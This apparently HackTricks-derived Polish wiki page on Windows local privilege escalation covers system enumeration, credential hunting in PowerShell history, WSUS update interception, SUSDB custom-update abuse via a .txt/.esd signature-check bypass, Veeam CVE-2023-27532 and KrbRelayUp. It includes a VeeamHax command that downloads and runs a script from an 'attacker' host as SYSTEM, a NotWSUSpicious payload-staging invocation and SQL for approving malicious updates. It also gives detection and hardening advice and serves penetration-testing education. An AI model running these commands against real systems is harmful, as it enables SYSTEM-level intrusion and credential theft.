# Eskalacja lokalnych uprawnień w Windows

{{#include ../../banners/hacktricks-training.md}}

### **Najlepsze narzędzie do wyszukiwania wektorów eskalacji lokalnych uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ta strona gromadzi ogólną metodologię eskalacji uprawnień w Windows z kilku podstawowych poradników.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Przedstawiony tu praktyczny proces enumeracji bazuje również na warsztatach społeczności i listach kontrolnych.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Materiały dotyczące historycznych ataków obejmują prezentację z DerbyCon na temat eskalacji uprawnień w Windows.<sup>[[5]](#references)</sup>

## Podstawy działania Windows

### Access Tokens

**Jeśli nie wiesz, czym są access tokens w Windows, przed kontynuowaniem przeczytaj tę stronę:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Więcej informacji o ACLs - DACLs/SACLs/ACEs znajdziesz na tej stronie:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Poziomy integralności

**Jeśli nie wiesz, czym są poziomy integralności w Windows, przed kontynuowaniem przeczytaj tę stronę:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Mechanizmy zabezpieczeń Windows

W Windows istnieją różne mechanizmy, które mogą **uniemożliwić enumerację systemu**, uruchamianie plików wykonywalnych, a nawet **wykryć Twoje działania**. Przed rozpoczęciem enumeracji na potrzeby eskalacji uprawnień **przeczytaj** tę **stronę** i **wylicz** wszystkie te **mechanizmy obronne**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Dostęp fizyczny może również umożliwić zamianę edycji UEFI NVRAM w trybie offline w łańcuch ataku wykorzystujący DMA przed rozruchem i modyfikację pamięci Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Ochrona administratora / cicha eskalacja uprawnień UIAccess

Procesy UIAccess uruchamiane za pośrednictwem `RAiLaunchAdminProcess` można wykorzystać do uzyskania High IL bez wyświetlania monitów, gdy obejdzie się kontrole bezpiecznej ścieżki AppInfo. Dedykowany proces obejścia zabezpieczeń UIAccess/Admin Protection znajdziesz tutaj:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagację rejestru dostępności Secure Desktop można wykorzystać do dowolnego zapisu w rejestrze jako SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Nowsze wersje Windows wprowadziły również ścieżkę LPE wykorzystującą **SMB na dowolnym porcie**, w której uprzywilejowane lokalne uwierzytelnienie NTLM jest odbijane przez ponownie użyte połączenie TCP SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacje o systemie

### Enumeracja informacji o wersji

Sprawdź, czy dana wersja Windows ma znane podatności (sprawdź również zainstalowane poprawki).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploity zależne od wersji

Ta [strona](https://msrc.microsoft.com/update-guide/vulnerability) przydaje się do wyszukiwania szczegółowych informacji o lukach w zabezpieczeniach Microsoftu. Baza zawiera ponad 4700 luk, co pokazuje **ogromną powierzchnię ataku** środowiska Windows.

**W systemie**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas zawiera watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — zbiera informacje o kompilacji systemu operacyjnego, zainstalowanych aktualizacjach i wybranych potencjalnie pasujących biuletynach; przed uznaniem wyniku za pasujący zweryfikuj dokładny produkt i aktualizacje zastępujące wcześniejsze poprawki.

W przypadku lokalnego exploita zależnego od wersji sprawdź **architekturę uruchomionego procesu**, a także architekturę systemu operacyjnego. W 64-bitowym Windows proces 32-bitowy podlega [przekierowaniu systemu plików WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` zwykle wskazuje katalog systemowy 32-bitowy, a `%windir%\Sysnative` zapewnia temu procesowi dostęp do natywnego katalogu systemowego. Alias ten jest niedostępny dla procesu 64-bitowego. Kompilacja systemu operacyjnego ani brak poprawki KB nie dowodzą, że exploit zadziała; porównaj uruchomioną kompilację, zainstalowaną lub zastępującą ją aktualizację, architekturę procesu i wymagania exploita z [biuletynem bezpieczeństwa Microsoftu](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) dotyczącym konkretnej luki.

Przykład korupcji pamięci usługi opisano w sekcji [offsetów pierścienia współdzielonej pamięci MIDI kontrolowanych przez klienta](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Opublikowane offsety stosu dotyczą wyłącznie testowanej kompilacji; uzyskanie uprawnień `LOCAL SERVICE` to odrębny etap od późniejszego przejścia [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) do `SYSTEM`.<sup>[[44]](#references)</sup>

**Lokalnie, na podstawie informacji o systemie**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria exploitów na Githubie:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy zmienne środowiskowe zawierają jakieś dane uwierzytelniające lub cenne informacje?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia PowerShella

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Pliki transkrypcji PowerShell

Możesz dowiedzieć się, jak to włączyć, tutaj: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` to tylko przykład. [Zasady transkrypcji PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) zwykle zapisują pliki w folderze Dokumenty każdego użytkownika, ale ustawienie `OutputDirectory` lub `Start-Transcript -OutputDirectory` może przekierować je do folderu współdzielonego lub ukrytego. Przed przejrzeniem transkrypcji sprawdź efektywną ścieżkę zapisu i ACL pliku: mogą się w niej znajdować argumenty poleceń i ich wyniki, w tym dane uwierzytelniające. Dostępna do odczytu transkrypcja jest wskazówką tylko wtedy, gdy jej zawartość ujawnia użyteczną tożsamość o wyższych uprawnieniach, która może zalogować się w odpowiednim kontekście.

### PowerShell Module Logging

Zapisywane są szczegóły wykonywania potoków PowerShell, w tym uruchomione polecenia, wywołania poleceń i fragmenty skryptów. Pełne szczegóły wykonania i wyniki mogą jednak nie zostać zarejestrowane.

Aby to włączyć, postępuj zgodnie z instrukcjami w sekcji „Pliki transkrypcji” dokumentacji i wybierz **„Module Logging”** zamiast **„Powershell Transcription”**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Aby wyświetlić ostatnie 15 zdarzeń z logów PowersShell, możesz wykonać:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rejestrowany jest pełny przebieg aktywności i pełna treść wykonywanego skryptu, dzięki czemu każdy blok kodu jest dokumentowany podczas działania. Proces ten zapewnia kompleksowy ślad audytowy każdej aktywności, przydatny w analizie kryminalistycznej i badaniu złośliwego działania. Dokumentowanie wszystkich czynności w chwili ich wykonywania pozwala uzyskać szczegółowy wgląd w przebieg procesu.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Zdarzenia rejestrowania dla Script Block można znaleźć w Podglądzie zdarzeń systemu Windows w ścieżce: **Dzienniki aplikacji i usług > Microsoft > Windows > PowerShell > Operacyjne**.\
Aby wyświetlić 20 ostatnich zdarzeń, możesz użyć:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ustawienia internetowe

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Dyski

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Wcześniejsze wskazówki podsumowywały ryzyko następująco:

Możesz przejąć kontrolę nad systemem, jeśli aktualizacje są pobierane przez http, a nie http**S**.

Endpoint WSUS używający HTTP jest wskazówką do dalszej analizy pod kątem przechwycenia metadanych aktualizacji. Wykorzystanie podatności zależy również od tego, czy klient korzysta z tego serwera WSUS, czy atakujący może przechwycić lub kontrolować jego ruch oraz od zasad zaufania i instalowania aktualizacji stosowanych przez klienta. Sam adres URL nie oznacza możliwości wykonania kodu. [Microsoft zaleca używanie TLS dla metadanych WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Na początek sprawdź, czy sieć korzysta z aktualizacji WSUS przez połączenie bez SSL, uruchamiając w cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Lub poniższe polecenie w PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Jeśli otrzymasz odpowiedź taką jak jedna z poniższych:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

A także jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` lub `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ma wartość `1`.

Pierwotne stwierdzenie dotyczące możliwości wykorzystania podatności brzmiało:

Wtedy **podatność można wykorzystać.** Jeśli wartość ostatniego wpisu rejestru wynosi `0`, wpis WSUS zostanie zignorowany.

Gdy `UseWUServer` ma wartość `1`, Windows Update korzysta ze skonfigurowanej usługi intranetowej. Potwierdza to spełnienie warunku wstępnego dla przechwytywania ruchu HTTP, ale nie dowodzi, że możliwe jest przechwycenie ruchu, zaakceptowanie złośliwej aktualizacji ani jej instalacja z podwyższonymi uprawnieniami. Gdy ma wartość `0`, ta konkretna skonfigurowana usługa WSUS nie jest wybierana przez tę politykę.

Do wykorzystania tych podatności można użyć narzędzi takich jak: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — to skrypty MiTM do wstrzykiwania „fałszywych” aktualizacji do ruchu WSUS, który nie korzysta z SSL.

Przeczytaj opracowanie:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Przeczytaj pełny raport tutaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Zasadniczo ta luka wykorzystuje następujący błąd:

> Jeśli możemy zmienić proxy naszego lokalnego użytkownika, a Windows Updates korzysta z proxy skonfigurowanego w ustawieniach Internet Explorera, możemy lokalnie uruchomić [PyWSUS](https://github.com/GoSecure/pywsus), aby przechwycić własny ruch i uruchomić kod z podwyższonymi uprawnieniami na naszym systemie.
>
> Ponadto, ponieważ usługa WSUS korzysta z ustawień bieżącego użytkownika, korzysta również z jego magazynu certyfikatów. Jeśli wygenerujemy certyfikat z własnym podpisem dla nazwy hosta WSUS i dodamy go do magazynu certyfikatów bieżącego użytkownika, będziemy mogli przechwytywać zarówno ruch HTTP, jak i HTTPS WSUS. WSUS nie używa mechanizmów podobnych do HSTS, które zapewniałyby walidację typu trust-on-first-use certyfikatu. Jeśli certyfikat jest zaufany przez użytkownika i zawiera prawidłową nazwę hosta, zostanie zaakceptowany przez usługę.

Tę podatność można wykorzystać za pomocą narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (gdy zostanie udostępnione).

### Aktualizacje WSUS publikowane i zatwierdzane przez administratora

Istnieje odrębna ścieżka, gdy bieżąca tożsamość może **publikować i zatwierdzać** aktualizacje na serwerze WSUS. Sprawdź efektywne członkostwo w grupie serwera `WSUS Administrators` oraz wszelkie delegowane uprawnienia WSUS, a następnie ustal grupę komputerów klienckich, która otrzyma zatwierdzoną aktualizację. [Microsoft wymaga uprawnień administratora WSUS do zatwierdzania aktualizacji](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) i [opisuje relację zaufania wymaganą do publikowania](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klienci muszą ufać certyfikatowi podpisującemu używanemu do publikowania lokalnej zawartości. Zanim uznasz to za ścieżkę eskalacji uprawnień, potwierdź, że dana aktualizacja jest podpisana i akceptowana, dotyczy systemu docelowego oraz jest instalowana w kontekście o wyższych uprawnieniach. Sama wartość HTTP `WUServer` lub nazwa grupy nie potwierdza spełnienia tych warunków.

### Nadużycie niestandardowych aktualizacji SUSDB: niepodpisane ładunki przez `.txt`/`.esd`

Jest to inne naruszenie granicy zaufania niż przechwytywanie połączenia WSUS przez HTTP: warunkiem wstępnym jest dostęp do **procedur składowanych bazy WSUS (`SUSDB`)** wystarczający do publikowania i zatwierdzania niestandardowych aktualizacji. Jedną z praktycznych dróg dostępu jest przekazanie uwierzytelnienia konta komputera WSUS do osobnego serwera MSSQL hostującego `SUSDB`; dokładny warunek wstępny zależy od wdrożenia, więc najpierw sprawdź uprawnienia `EXECUTE`, zamiast zakładać, że wymagane są uprawnienia administratora SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Informacje o odrębnej ścieżce ataku, w której uwierzytelnianie klienta WSUS jest przekazywane z HTTP/8530 do LDAP, SMB lub AD CS, znajdziesz w artykule [Nadużywanie WSUS HTTP do NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Potwierdź przekazanie uwierzytelnienia do zewnętrznej bazy danych i uprawnienia do procedur

We wdrożeniach, w których WSUS korzysta z zewnętrznego serwera SQL Server, najpierw sprawdź, czy konto serwera WSUS może uwierzytelnić się w bazie danych i czy NTLM relay dociera do tego nasłuchującego serwera. Rola serwera SQL może udostępniać procedury publikowania aktualizacji nawet wtedy, gdy bezpośredni zapis do tabel jest zabroniony; nieudana instrukcja `UPDATE` w `SUSDB` nie dowodzi, że publikowanie jest zablokowane. Przed próbą opublikowania niestandardowej aktualizacji sprawdź efektywną tożsamość, członkostwo w rolach i uprawnienia do procedur podczas autoryzowanej sesji SQL.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Aktualne definicje procedur i zainstalowany plik `SoftwareDistributionPackage.xsd` są przydatne przy odtwarzaniu poprawnych metadanych aktualizacji. Zarówno nadrzędny bundle, jak i podrzędny payload wymagają `UpdateIdentity` (typ fragmentu `1`), `LocalizedProperties` (`4`) i `ExtendedProperties` (`2); przechwyć lokalny identyfikator rewizji zwracany przez każde wywołanie `spImportUpdate` i zachowaj spójność relacji bundle, skrótów, rozmiaru, URL-a zawartości oraz rewizji. Jest to proces publikowania oparty na stanie, dlatego pojedyncze pomyślne wywołanie procedury składowanej nie dowodzi wykonania po stronie klienta.<sup>[[38]](#references)</sup>

#### Zbuduj, skieruj i zatwierdź aktualizację

Proces obsługi niestandardowych aktualizacji wykorzystuje legalne procedury WSUS jako ograniczone API publikowania. Ważne zmiany stanu to:<sup>[[38]](#references)</sup>

| Etap | Odpowiednie procedury składowane |
| --- | --- |
| Import metadanych aktualizacji | `spImportUpdate` |
| Zapisanie fragmentów XML dotyczących wymagań wstępnych, lokalizacji i właściwości rozszerzonych | `spSaveXMLFragment` |
| Powiązanie skrótu zawartości z kontrolowanym przez atakującego URL-em | `spSetBatchURL` |
| Wyświetlenie grup komputerów lub utworzenie grupy i dodanie klienta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Zatwierdzenie instalacji dla tej grupy | `spDeployUpdate` z `@actionID = 0` i `@isAssigned = 1` |

Nazwa pliku, skróty, rozmiar i procedura obsługi `CommandLineInstallation` muszą być zgodne w zaimportowanych metadanych i fragmentach. Po przypisaniu URL-a zawartości i grupy docelowej końcowe zatwierdzenie wygląda następująco; użyj nowych identyfikatorów aktualizacji, grupy i wdrożenia zamiast ponownie wykorzystywać przykładowe GUID-y.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Ominięcie weryfikacji podpisu przez rozszerzenie

WSUS zwykle odrzuca dowolną, niepodpisaną zawartość wykonywalną. Jednak w pliku `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` ścieżka `.NET` `VerifyFile` ustawia flagę sprawdzania certyfikatu na `false`, gdy podana nazwa pliku kończy się na `.txt` lub `.esd`; `CheckCertificateSignature` zostaje wtedy pominięte bez wcześniejszego potwierdzenia, że bajty zawierają tekst lub prawidłowy obraz ESD. Dlatego niezmieniony plik PE o nazwie na przykład `payload.exe.txt` może przejść weryfikację zawartości, a następnie zostać uruchomiony przez procedurę obsługi instalacji aktualizacji z wiersza poleceń. To błąd typu pomylenie polityki i typu, a nie fałszowanie podpisu.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging i automatyzacja zgodne z BITS

Wywołanie `spDeployUpdate` powoduje, że WSUS pobiera zarejestrowaną zawartość. Źródło musi spełniać wymagania HTTP protokołu BITS: sam dostępny URL nie wystarczy, ponieważ transfer wykorzystuje początkową sekwencję `HEAD`/`GET` oraz żądania zakresów bajtów. Serwer bez obsługi Range powoduje błąd synchronizacji WSUS `EventId=364` z informacją, że BITS wymaga nagłówka protokołu Range.<sup>[[39]](#references)</sup>

Badawczy PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generuje SQL wymagany do przeprowadzenia łańcucha importu/fragmentu/URL/grupy/wdrożenia, zawiera zmodyfikowanego klienta MSSQL do jego wykonania oraz udostępnia `BitsWebServer.py` do stagingu zawartości. Minimalne polecenie do użycia w autoryzowanym laboratorium:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Wykonywanie bez nadzoru i persistence przez ponawianie prób

Interakcja po stronie klienta zależy od zasad. Ustawienie `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcja `4 - Auto download and schedule install`, powoduje pobranie i zainstalowanie zatwierdzonej aktualizacji zgodnie z skonfigurowanym harmonogramem, bez ręcznego wybierania jej przez użytkownika. Podczas testów payload, którego aktualizacja pozostawała w stanie niepowodzenia/nieukończenia, był ponownie oferowany natychmiast po zakończeniu procesu callback, więc mechanizm ponawiania prób może zapewniać recurring execution persistence; jest to jednak łatwe do wykrycia, ponieważ klient zgłasza niepowodzenie aktualizacji.<sup>[[39]](#references)</sup>

#### Wskazówki dotyczące wykrywania i hardeningu

Przydatne wskazówki po stronie serwera i klienta dotyczące tego łańcucha:<sup>[[39]](#references)</sup>

- Audytuj wykonywanie `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` w `SUSDB`; badaj nowe grupy docelowe, zewnętrzne źródła zawartości, payloady aktualizacji `.txt`/`.esd` oraz wdrożenia wykonywane przez nieoczekiwane podmioty (szczególnie konta inne niż komputerowe).
- Sprawdzaj `C:\Program Files\Update Services\LogFiles` pod kątem wpisów `ContentSyncAgent`, `FileVerified`, błędnie zapisanego `FileVerficationFailed` i `EventId=364`; koreluj weryfikację z rozszerzeniem payloadu i sygnaturą zawartości, zamiast ufać rozszerzeniu pliku.
- Wyszukuj wielokrotnie kończące się niepowodzeniem/ponawiane instalacje Windows Update oraz wykonanie PE lub nieoczekiwane aktywności procesów potomnych/sieciowe związane z zawartością o nazwach `.txt` lub `.esd`.
- Tam, gdzie jest to obsługiwane, wymagaj Extended Protection for Authentication dla usługi bazy danych i ogranicz dostęp sieciowy do bazy do serwera WSUS oraz autoryzowanych systemów administracyjnych. Ogranicz i audytuj uprawnienia `EXECUTE` do procedur niestandardowych aktualizacji.

## Zewnętrzne programy aktualizujące i IPC agentów (local privesc)

Wiele agentów korporacyjnych udostępnia powierzchnię IPC na localhost oraz uprzywilejowany kanał aktualizacji. Jeśli rejestrację można wymusić na serwerze atakującego, a program aktualizujący ufa fałszywemu głównemu CA lub stosuje słabe kontrole podpisu, użytkownik lokalny może dostarczyć złośliwy MSI, który usługa SYSTEM zainstaluje. Uogólniony opis techniki (oparty na łańcuchu Netskope stAgentSvc – CVE-2025-0309) znajduje się tutaj:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM przez TCP 9401)

Pierwotny opis dotyczący konkretnej wersji oraz wskazówka rozpoznawcza brzmiały:

Veeam B&R < `11.0.1.1261` udostępnia usługę localhost na **TCP/9401**, która przetwarza wiadomości kontrolowane przez atakującego, umożliwiając wykonywanie dowolnych poleceń jako **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Rozpoznanie**: potwierdź nasłuchiwanie i wersję, np. za pomocą `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication i Cloud Connect domyślnie korzystają z podstawowej usługi backupu na **TCP/9401**. [Komunikat Veeam](https://www.veeam.com/kb4424) opisuje nieuwierzytelnione ujawnienie zaszyfrowanych poświadczeń bazy konfiguracji w obrębie sieci backupu; osobny publiczny PoC demonstruje ścieżkę wykonywania poleceń jako **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Usługa może nasłuchiwać również poza localhost, sprawdź więc jej rzeczywisty adres i PID.

- **Rozpoznanie**: potwierdź, że TCP/9401 należy do `Veeam.Backup.Service.exe`, a następnie sprawdź zainstalowany produkt i metadane poprawek. `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` to wskazówki, a nie pełna weryfikacja poprawek.
- **Wersje z poprawką**: Veeam wskazuje **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** jako pierwsze wersje z poprawką; wcześniejsze wydania są podatne. Czteroczłonowa wersja pliku nie wystarczy, by odróżnić niezałatany bazowy build od późniejszej poprawki dla tych samych numerów buildów. Przed uznaniem granicznego buildu za poprawiony zweryfikuj identyfikator poprawki w [historii buildów dostawcy](https://www.veeam.com/kb2680).
- **Exploit**: umieść PoC, taki jak `VeeamHax.exe`, wraz z wymaganymi bibliotekami DLL Veeam w tym samym katalogu, a następnie uruchom payload SYSTEM przez lokalne gniazdo:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Usługa wykonuje polecenie jako SYSTEM.

Przytoczony PoC demonstruje wykonanie polecenia jako SYSTEM, jeśli spełnione są dodatkowe wymagania wstępne; zalecenie dostawcy opisuje problem ujawnienia poświadczeń.

## KrbRelayUp

Oryginalny opis domyślnego środowiska brzmiał:

W środowiskach domenowych Windows występuje podatność umożliwiająca **lokalne podniesienie uprawnień** w określonych warunkach. Obejmują one środowiska, w których **podpisywanie LDAP nie jest wymuszane,** użytkownicy mają uprawnienia własne pozwalające im konfigurować **Resource-Based Constrained Delegation (RBCD)**, a także możliwość tworzenia komputerów w domenie. Należy pamiętać, że te **wymagania** są spełnione przy użyciu **ustawień domyślnych**.

Lokalny relay Kerberos może umożliwić przejście od logowania użytkownika o niższych uprawnieniach do uprzywilejowanego zapisu w katalogu, jeśli odpowiedni serwer COM się uwierzytelni, a przekazany podmiot ma uprawnienia do obiektu docelowego. [KrbRelay](https://github.com/cube0x0/KrbRelay) obsługuje zarówno zapisy LDAP związane z RBCD, jak i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatyzuje niektóre z tych ścieżek. Łańcuch RBCD wymaga odpowiednich uprawnień delegowania i uprawnień do obiektu docelowego, a łańcuch shadow-credential wymaga uprawnień do zapisu poświadczeń klucza oraz KDC obsługującego ścieżkę uwierzytelniania certyfikatem. Żadna z tych ścieżek nie wynika z samego członkostwa w domenie.

Sprawdź faktyczną politykę kontrolera domeny dotyczącą [podpisywania LDAP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [wiązania kanału LDAPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), listę ACL obiektu dla przekazywanej tożsamości oraz poziomy uwierzytelniania i personifikacji wybranej klasy COM. Znaczenie mają typ logowania wywołującego i kontekst poświadczeń: sesja WinRM może zachowywać się inaczej niż logowanie interaktywne lub logowanie z użyciem nowych poświadczeń. Wynik mogą też zmienić reguły zapory, routing OXID i zainstalowane aktualizacje. Traktuj liberalną politykę lub pasującą listę ACL jako element wymagający weryfikacji; pasywne rozpoznanie nie powinno wywoływać wymuszenia COM, uwierzytelniania relay ani zapisów w katalogu. Shadow credential konta komputera może umożliwić uzyskanie biletu komputera i — tylko jeśli to konto ma wymagane uprawnienia replikacji katalogu — osobną ścieżkę DCSync.

Znajdź **exploit w** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Więcej informacji o przebiegu ataku znajdziesz w [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

